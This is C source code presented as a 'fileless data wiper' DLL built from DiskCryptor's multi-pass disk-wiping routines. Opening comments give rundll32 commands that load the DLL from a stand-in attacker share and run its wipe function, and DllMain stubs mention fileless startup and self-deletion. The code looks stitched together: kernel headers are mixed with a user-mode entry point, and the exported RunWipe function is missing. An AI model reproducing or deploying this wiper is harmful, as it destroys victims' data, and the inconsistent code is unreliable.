//rundll32.exe \\attacker\share\fileless_wiper.dll,RunWipe
// if hosted on a share: 
//net use Z: \\attacker\share , rundll32.exe Z:\fileless_wiper.dll,RunWipe

/*
 * DiskCryptor-based Fileless Data Wiper (DLL Variant)
 * Integrated from multiple wipe modes with fileless execution improvements
 */

#include <ntifs.h>
#include "defines.h"
#include "prng.h"
#include "devhook.h"
#include "data_wipe.h"
#include "misc.h"
#include "fast_crypt.h"
#include "misc_mem.h"
#include "device_io.h"

static wipe_mode dod_mode = {
    7,
    {
        { P_PAT,  { 0x55, 0x55, 0x55 } },
        { P_PAT,  { 0xAA, 0xAA, 0xAA } },
        { P_RAND, { 0x00, 0x00, 0x00 } },
        { P_PAT,  { 0x00, 0x00, 0x00 } },
        { P_PAT,  { 0x55, 0x55, 0x55 } },
        { P_PAT,  { 0xAA, 0xAA, 0xAA } },
        { P_RAND, { 0x00, 0x00, 0x00 } }
    }
};

static wipe_mode *wipe_modes[] = {
    NULL,
    &dod_mode
};

int dc_wipe_init(wipe_ctx *ctx, void *hook, int max_size, int method, int cipher) {
    char key[32];
    int resl;

    do {
        memset(ctx, 0, sizeof(wipe_ctx));

        if (method > sizeof(wipe_modes) / sizeof(wipe_mode *)) {
            resl = ST_INV_WIPE_MODE;
            break;
        }

        ctx->mode = wipe_modes[method];
        resl = ST_NOMEM;

        if (ctx->mode) {
            ctx->buff = mm_pool_alloc(max_size);
            if (!ctx->buff) break;

            ctx->key = mm_secure_alloc(sizeof(xts_key));
            if (!ctx->key) break;

            cp_rand_bytes(key, sizeof(key));
            xts_set_key(key, cipher, ctx->key);
        }

        ctx->hook = hook;
        ctx->size = max_size;
        resl = ST_OK;

    } while (0);

    burn(key, sizeof(key));

    if (resl != ST_OK) {
        if (ctx->buff) mm_pool_free(ctx->buff);
        if (ctx->key) mm_secure_free(ctx->key);
    }

    return resl;
}

void dc_wipe_free(wipe_ctx *ctx) {
    if (ctx->buff) mm_pool_free(ctx->buff);
    if (ctx->key) mm_secure_free(ctx->key);
    ctx->buff = NULL;
    ctx->key = NULL;
}

int dc_wipe_process(wipe_ctx *ctx, u64 offset, int size) {
    if (size > ctx->size) return ST_INV_DATA_SIZE;
    if (!ctx->mode) return ST_OK;

    for (int i = 0; i < ctx->mode->passes; i++) {
        if (ctx->mode->pass[i].type == P_PAT) {
            memset(ctx->buff, ctx->mode->pass[i].pat[0], size);
        } else if (ctx->mode->pass[i].type == P_RAND) {
            cp_rand_bytes(ctx->buff, size);
        }

        fast_wipe_write(ctx->hook, offset, ctx->buff, size);
    }

    xts_encrypt_block(ctx->key, ctx->buff, size); // Final XTS encryption
    fast_wipe_write(ctx->hook, offset, ctx->buff, size);

    return ST_OK;
}

// DLL Entry Point (Fileless logic target)
NTSTATUS NTAPI DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls((HMODULE)hModule);
        // Initialization and fileless startup logic should be embedded here.
        break;
    case DLL_PROCESS_DETACH:
        // Cleanup or self-delete logic
        break;
    }
    return STATUS_SUCCESS;
}
